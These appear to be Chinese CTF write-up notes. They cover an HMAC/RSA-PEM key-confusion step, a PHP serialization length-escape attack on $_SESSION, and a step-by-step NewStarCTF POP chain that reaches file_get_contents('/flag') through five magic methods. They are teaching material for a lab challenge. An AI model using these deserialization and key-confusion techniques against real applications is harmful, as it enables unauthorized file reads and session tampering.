pem = RSAPublicNumbers(e, n).public_key().public_bytes(
    serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo)
open("service_public.pem", "wb").write(pem)

    HMAC 的密钥必须是 PEM 的原始字节

    HMAC 会先把密钥 padding 到 64 字节再算，密钥里每一个字节都参与运算：

    • 去掉结尾的 \n → 变了
    • \n 换成 \r\n → 变了
    • 只取中间的 base64 段、或改用 DER → 变了

    差一个换行，服务端算出来的就和你算出来的不是一个值，返回 401。

    漏洞原理

    ① 长度声明是“过滤前”算的

    serialize() 生成的 s:N:"..." 是按当时内容的长度算的；filter() 改了内容，N 却不会变。

    解析器只认 N：它从引号后精确数 N 个字节。内容短了，它就多读到后面的东西——多读的部分被当成新结构。

    ② 错位点在哪，决定了你能不能控制

    填充在值里   →  值本身断裂，后面全被当字符吞掉  →  不可控
填充在键名里 →  值完整，断点落在"键名结束 → 值开始"  →  可控

    ③ extract() 同名会整体替换

    _POST['_SESSION'] 是数组，extract 会把它整个赋给 $_SESSION，不是合并。所以 user、function 消失了，数组只剩你的键和 img。**

    这也是为什么 a:2——不是 3。

    知识点 说明
    序列化逃逸 s:N:"..." 的 N 是过滤前算的，内容变短后解析器会多读
    填充位置 放键名可控，放值里会把你的结构一起吞掉
    ;s:1:"1"; 假元素，用来把元素数凑回 a:N 声明的数量

    ① 填充放在值里

    最常见的错。看起来"filter 会删掉填充，所以后面就对齐了"——恰恰相反：填充被删掉只会让声明比内容更长，多出来的长度把后面的一切都吃掉。

    [NewStarCTF] UnserializeOne — 五个魔术方法串成一条链

    题目类型：PHP 反序列化 — POP 链构造（魔术方法连环触发）

    Flag：CTF2{a3ae15bd-2047-4dd5-b9b3-c0dccb22c632}

    题目概述

    给一份源码，入口就一句：

    if(isset($_POST['pop'])){
    unserialize($_POST['pop']);
}

    四个类：Start、Sec、Easy、eeee，各带魔术方法。任务是拼一条从 unserialize 走到 file_get_contents('/flag') 的链。

    解题过程

    Step 1：先找终点——flag 在哪被读出来

    class Sec{
    public function __invoke()
    {
        echo file_get_contents('/flag');
    }
}

    终点在 Sec::__invoke()。

    __invoke 的触发条件：把一个对象当成函数来调用，也就是 $obj()。

    Step 2：谁会把对象当函数调用

    class Start{
    public function __isset($var)
    {
        ($this->func)();
    }
}

    ($this->func)() —— 这就是“把 $this->func 当函数调用”。只要 $this->func 是一个 Sec 对象，就会走到 Sec::__invoke。

    所以现在要找：__isset 怎么被触发。

    __isset 的触发条件：对不可访问或不存在的属性调用 isset()（或 empty()）。

    Step 3：谁会对不存在的属性调用 isset

    class eeee{
    public $obj;
    public function __clone()
    {
        if(isset($this->obj->cmd)){
            echo "success";
        }
    }
}

    isset($this->obj->cmd) —— 如果 $this->obj 是个 Start 对象，而 Start 里没有 cmd 这个属性，这就是“对不存在的属性调用 isset”，正好触发 Start::__isset。

    所以 eeee->obj 要指向一个 Start，而那个 Start 的 func 要指向一个 Sec。

    下一个问题：__clone 怎么触发？

    Step 4：谁在 clone 对象

    class Easy{
    public $cla;
    public function __call($fun, $var)
    {
        $this->cla = clone $var[0];
    }
}

    clone $var[0] —— 直接触发被 clone 对象的 __clone。

    __call 的触发条件：调用了对象上不存在的方法。

    Step 5：谁调用了不存在的方法

    class Sec{
    public function __toString()
    {
        $this->obj->check($this->var);
        return "CTFers";
    }
}

    $this->obj->check($this->var) —— check 这个方法四个类里都没有，所以只要 $this->obj 是 Easy，就会触发 Easy::__call，而且第一个参数正好是 $this->var（也就是我们要 clone 的那个 eeee 对象）。

    __toString 的触发条件：对象被当成字符串使用。

    Step 6：谁把对象当字符串用了

    class Start{
    public function __destruct()
    {
        echo "Welcome to NewStarCTF, ".$this->name;
    }
}

    字符串拼接 "..." . $this->name —— 如果 $this->name 是个 Sec 对象，就会触发 Sec::__toString。

    而 __destruct 是对象被销毁时自动调用——反序列化出来的对象在脚本结束时都会析构，所以这里是天然的起点。

    完整链条

    unserialize 结束、脚本运行完毕
  → Start::__destruct()            对象销毁自动触发
    → 字符串拼接 $this->name
      → Sec::__toString()          对象被当字符串用
        → $this->obj->check(...)   调用不存在的方法
          → Easy::__call()         不存在的方法被调用
            → clone $var[0]        克隆对象
              → eeee::__clone()    对象被 clone
                → isset($this->obj->cmd)   不存在的属性
                  → Start::__isset()       对不存在的属性 isset
                    → ($this->func)()      对象当函数调用
                      → Sec::__invoke()    对象当函数
                        → file_get_contents('/flag')

    五个魔术方法，一层扣一层，最后落在读文件上。

    解题思路总结

    从能读 flag 的地方倒推：
  file_get_contents  → Sec::__invoke
    ← 谁把对象当函数调用？  Start::__isset 的 ($this->func)()
      ← 谁触发 __isset？    eeee::__clone 的 isset($this->obj->cmd)
        ← 谁触发 __clone？  Easy::__call 的 clone $var[0]
          ← 谁触发 __call？ Sec::__toString 的 $this->obj->check()
            ← 谁触发 __toString？ Start::__destruct 的字符串拼接

    每一步都在问同一个问题：要走到下一步，得先满足什么条件？——然后去别的类里找满足这个条件的地方。

    漏洞原理

    ① 魔术方法 = 自动触发的“钩子”

    PHP 在很多操作上埋了钩子：对象销毁、被当字符串、被当函数、访问不存在的属性、调用不存在的方法、被 clone……开发者通常不知道这些钩子会在什么时候被调用。

    ② 只要链上每一环的属性都可控，就能拼出一条执行路径

    unserialize 允许攻击者指定属性的类型和内容——一个字符串可以变成对象、对象可以变成另一个类的对象。于是本来毫无关系的四个类，被拼成了一条完整的调用链。

    这就是 POP 链（Property-Oriented Programming）：不执行代码，只摆对象，让程序自己走过去。**

    ③ 最终的 sink 是 file_get_contents('/flag')

    链子本身不做坏事，它只是把执行流送到那个能读文件的方法里。

    关键知识点

    魔术方法 触发条件
    __destruct() 对象被销毁（脚本结束时自动调用）
    __toString() 对象被当成字符串使用（拼接、echo、比较）
    __call($name,$args) 调用了不存在的方法
    __clone() 对象被 clone 时
    __isset($name) 对不存在/不可访问的属性调用 isset() 或 empty()
    __invoke() 对象被当成函数调用，如 $obj()
    属性可见性：protected / private 的写法不一样

    本题源码里四个类的属性在页面截图上都是 public，所以直接写属性名就行。

    但如果遇到 protected 或 private，序列化串里的名字要带前缀，而且长度要把前缀算进去：

    public     s:4:"name";          直接写名字
protected  s:7:"\0*\0name";     前面是 \0 + * + \0，共 3 字节前缀
private    s:10:"\0Sec\0name";  前面是 \0 + 类名 + \0

    本地构造时要按目标类的真实可见性来写，否则反序列化出来的属性是“同名但不是同一个”，魔术方法里读到的会是你没设置的那个。

    这题踩的坑

    ① 起点不要从某个类硬找

    这题的起点是 __destruct——它不需要任何操作就会触发，所以从“谁最先被自动调用”往回推，比从入口 unserialize 正着推更快。

    ② 把它当成“倒推题”而不是“写代码题”

    链子上每一环的答案都藏在别的类里，不需要写新代码，只需要摆对象。

    ③ 本地搭一份再改

    把四个类复制到本地 PHP 里，用 serialize() 生成基础串，再对着改属性——比自己手数括号可靠得多。
